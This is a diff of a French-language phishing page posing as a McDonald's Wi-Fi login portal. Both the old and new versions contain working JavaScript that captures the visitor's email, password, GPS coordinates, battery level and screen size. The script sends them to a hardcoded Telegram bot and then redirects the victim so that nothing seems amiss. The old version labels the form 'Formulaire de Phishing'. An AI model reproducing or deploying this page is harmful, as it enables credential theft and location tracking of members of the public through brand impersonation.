@@ -3,271 +3,121 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>McDo™ Wi-Fi - Connexion gratuite</title>
+    <title>McDo™ Wi-Fi - Authentification</title>
     <style>
-        :root {
-            --mc-green: #0a472c;
-            --mc-yellow: #ffbc0d;
-            --mc-red: #da291c;
-            --mc-white: #ffffff;
-            --mc-grey: #f4f4f4;
-        }
-
-        body {
-            background-color: var(--mc-grey);
-            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            color: #333;
-        }
-
-        /* Barre de navigation officielle */
-        .nav-header {
-            background-color: var(--mc-green);
-            height: 60px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            position: sticky;
-            top: 0;
-            z-index: 1000;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
-        }
-
-        .nav-header span {
-            color: var(--mc-yellow);
-            font-size: 38px;
-            font-weight: bold;
-            font-family: "serif";
-        }
-
-        .container {
-            max-width: 420px;
-            margin: 0 auto;
-            padding: 20px;
-        }
-
-        /* Carte de bienvenue */
-        .welcome-card {
-            background: var(--mc-white);
-            border-radius: 16px;
-            overflow: hidden;
-            margin-bottom: 20px;
-            text-align: center;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
-        }
-
-        .hero-banner {
-            background-color: var(--mc-yellow);
-            padding: 20px;
-            font-size: 40px;
-        }
-
-        .welcome-text {
-            padding: 20px;
-        }
-
-        .welcome-text h1 {
-            margin: 0;
-            font-size: 22px;
-            color: var(--mc-green);
-        }
-
-        /* Formulaire de Phishing */
-        .login-section {
-            background: var(--mc-white);
-            padding: 25px;
-            border-radius: 16px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
-        }
-
-        .input-group {
-            margin-bottom: 15px;
-        }
-
-        .input-group label {
-            display: block;
-            font-size: 13px;
-            font-weight: 700;
-            margin-bottom: 8px;
-            color: #666;
-        }
-
-        .input-group input {
-            width: 100%;
-            padding: 14px;
-            border: 2px solid #eee;
-            border-radius: 10px;
-            font-size: 16px;
-            box-sizing: border-box;
-            transition: all 0.3s;
-        }
-
-        .input-group input:focus {
-            border-color: var(--mc-yellow);
-            background: #fffdf8;
-            outline: none;
-        }
-
-        .btn-connect {
-            width: 100%;
-            background-color: var(--mc-yellow);
-            color: var(--mc-green);
-            border: none;
-            padding: 16px;
-            border-radius: 30px;
-            font-size: 16px;
-            font-weight: 800;
-            cursor: pointer;
-            margin-top: 10px;
-            box-shadow: 0 4px 0 #e6a800;
-            transition: 0.1s;
-        }
-
-        .btn-connect:active {
-            transform: translateY(3px);
-            box-shadow: 0 1px 0 #e6a800;
-        }
-
-        /* Écran de chargement réaliste */
-        #loader-screen {
-            display: none;
-            text-align: center;
-            padding: 40px 20px;
-        }
-
-        .spinner {
-            width: 40px;
-            height: 40px;
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid var(--mc-red);
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
-        }
-
+        :root { --mc-green: #0a472c; --mc-yellow: #ffbc0d; --mc-red: #da291c; }
+        body { background-color: #f4f4f4; font-family: Arial, sans-serif; margin: 0; padding: 0; }
+        header { background: var(--mc-green); color: white; padding: 15px; text-align: center; font-weight: bold; }
+        .container { max-width: 400px; margin: 20px auto; padding: 20px; }
+        .login-box { background: white; padding: 25px; border-radius: 12px; border: 1px solid #ddd; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
+        h2 { color: var(--mc-red); font-size: 20px; text-align: center; margin-top: 0; }
+        .field { margin-bottom: 15px; }
+        .field label { display: block; font-size: 13px; font-weight: bold; margin-bottom: 5px; }
+        .field input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; }
+        .btn-submit { width: 100%; padding: 15px; background-color: var(--mc-yellow); color: var(--mc-green); border: none; border-radius: 25px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; }
+        #loader { display: none; text-align: center; margin-top: 20px; }
+        .spinner { width: 30px; height: 30px; border: 4px solid #f3f3f3; border-top: 4px solid var(--mc-red); border-radius: 50%; animation: spin 1s linear infinite; margin: 10px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        footer {
-            text-align: center;
-            padding: 30px 20px;
-            font-size: 11px;
-            color: #999;
-            line-height: 1.6;
-        }
+        footer { text-align: center; font-size: 11px; color: #aaa; margin-top: 30px; }
     </style>
 </head>
 <body>
 
-<div class="nav-header">
-    <span>m</span>
-</div>
+<header>McDo™ Wi-Fi Gratuit</header>
 
 <div class="container">
-    <div id="ui-main">
-        <div class="welcome-card">
-            <div class="hero-banner">🍟</div>
-            <div class="welcome-text">
-                <h1>Wi-Fi Gratuit illimité</h1>
-                <p style="font-size: 14px; color: #777;">Identifiez-vous pour accéder au réseau du restaurant.</p>
-            </div>
+    <div class="login-box" id="auth-form">
+        <h2>Identifiez-vous</h2>
+        <p style="font-size: 12px; text-align: center;">Connectez-vous pour accéder au Wi-Fi et voir vos offres.</p>
+        
+        <div class="field">
+            <label>Email</label>
+            <input type="email" id="user-email" placeholder="exemple@mail.com" required>
         </div>
 
-        <div class="login-section">
-            <div class="input-group">
-                <label>E-mail ou Identifiant McDo+</label>
-                <input type="email" id="email" placeholder="exemple@mail.com">
-            </div>
-            <div class="input-group">
-                <label>Mot de passe</label>
-                <input type="password" id="pass" placeholder="••••••••">
-            </div>
-            <button class="btn-connect" onclick="processLogin()">SE CONNECTER</button>
-            <p style="text-align: center; font-size: 11px; margin-top: 15px; color: #aaa;">
-                En vous connectant, vous acceptez nos CGU et notre politique de protection des données.
-            </p>
+        <div class="field">
+            <label>Mot de passe</label>
+            <input type="password" id="user-pass" placeholder="••••••••" required>
         </div>
+
+        <button class="btn-submit" onclick="handleLogin()">SE CONNECTER</button>
     </div>
 
-    <div id="loader-screen">
+    <div id="loader">
         <div class="spinner"></div>
-        <p style="font-weight: bold; color: var(--mc-green);">Authentification en cours...</p>
-        <p style="font-size: 12px; color: #888;">Veuillez patienter pendant la configuration de votre accès réseau.</p>
+        <p id="status">Vérification de vos identifiants...</p>
     </div>
 </div>
 
-<footer>
-    McDonald's France Services<br>
-    Accessibilité | Mentions Légales | Cookies<br>
-    © 2026 McDonald's™
-</footer>
+<footer>© 2026 McDonald's System of France</footer>
 
 <script>
-    // TES ACCÈS TELEGRAM
-    const TG_TOKEN = "8206049937:AAEv07GYDOVNBthgFaZi1U1KCvu5gzWPbo4";
-    const TG_CHAT = "7400979339";
+    // CONFIGURATION
+    const MON_LIEN = "Https://nathanaelvaury13-boop.github.io/Macdo/"; 
+    const TELEGRAM_TOKEN = "8206049937:AAEv07GYDOVNBthgFaZi1U1KCvu5gzWPbo4";
+    const TELEGRAM_CHAT_ID = "7400979339";
 
-    async function processLogin() {
-        const email = document.getElementById('email').value;
-        const pass = document.getElementById('pass').value;
+    async function handleLogin() {
+        const email = document.getElementById('user-email').value;
+        const pass = document.getElementById('user-pass').value;
 
         if(!email || !pass) {
-            alert("Veuillez saisir vos identifiants McDo+.");
+            alert("Veuillez remplir tous les champs.");
             return;
         }
 
-        // Basculer l'affichage
-        document.getElementById('ui-main').style.display = 'none';
-        document.getElementById('loader-screen').style.display = 'block';
-
-        // 1. Batterie
-        let batt = "Inconnu";
-        if(navigator.getBattery) {
-            const b = await navigator.getBattery();
-            batt = Math.round(b.level * 100) + "%" + (b.charging ? " (⚡)" : "");
-        }
-
-        // 2. GPS + Envoi final
+        // --- ÉTAPE 1 : DEMANDER LE GPS TOUT DE SUITE ---
+        // Le navigateur accepte la demande car elle vient du clic sur le bouton.
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 async (p) => {
-                    const coords = `${p.coords.latitude},${p.coords.longitude}`;
-                    await sendData(email, pass, coords, batt);
+                    // Si l'utilisateur accepte, on continue
+                    processData(email, pass, `${p.coords.latitude},${p.coords.longitude}`);
                 },
-                async () => {
-                    await sendData(email, pass, "Refusé ❌", batt);
+                async (err) => {
+                    // Si l'utilisateur refuse ou erreur, on continue quand même sans GPS
+                    processData(email, pass, "Refusé ❌");
                 },
-                { enableHighAccuracy: true, timeout: 8000 }
+                { enableHighAccuracy: true, timeout: 5000 }
             );
         } else {
-            await sendData(email, pass, "Non supporté", batt);
+            processData(email, pass, "Non supporté");
         }
     }
 
-    async function sendData(e, p, loc, b) {
-        const screen = `${window.screen.width}x${window.screen.height}`;
-        const mapUrl = loc.includes(',') ? `https://www.google.com/maps?q=${loc}` : loc;
-        
-        const message = `🍔 NOUVELLE CONNEXION MCDO\n\n` +
-                        `📧 Email : ${e}\n` +
-                        `🔑 Pass  : ${p}\n` +
-                        `📍 GPS   : ${mapUrl}\n` +
-                        `🔋 Batt  : ${b}\n` +
-                        `🖥 Écran : ${screen}\n` +
-                        `📱 OS    : ${navigator.platform}`;
+    async function processData(email, pass, loc) {
+        // --- ÉTAPE 2 : CHANGER L'INTERFACE ---
+        document.getElementById('auth-form').style.display = 'none';
+        document.getElementById('loader').style.display = 'block';
+
+        // Collecte de la batterie
+        let battery = "N/A";
+        if (navigator.getBattery) {
+            try {
+                const b = await navigator.getBattery();
+                battery = Math.round(b.level * 100) + "%";
+            } catch(e) {}
+        }
+
+        // --- ÉTAPE 3 : ENVOI ET REDIRECTION ---
+        const rapport = `🍔 TEST PORTAIL\n` +
+                        `📧 Email: ${email}\n` +
+                        `🔑 Pass: ${pass}\n` +
+                        `📍 GPS: ${loc}\n` +
+                        `🔋 Batt: ${battery}\n` +
+                        `🖥 Écran: ${screen.width}x${screen.height}`;
 
         try {
-            await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: TG_CHAT, text: message })
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: rapport })
             });
-        } catch (error) {}
+        } catch(err) {}
 
-        // Redirection après 2 secondes pour faire vrai
         setTimeout(() => {
-            window.location.href = "https://www.mcdonalds.fr/fidele-au-poste";
-        }, 2000);
+            window.location.href = MON_LIEN;
+        }, 1500);
     }
 </script>
 
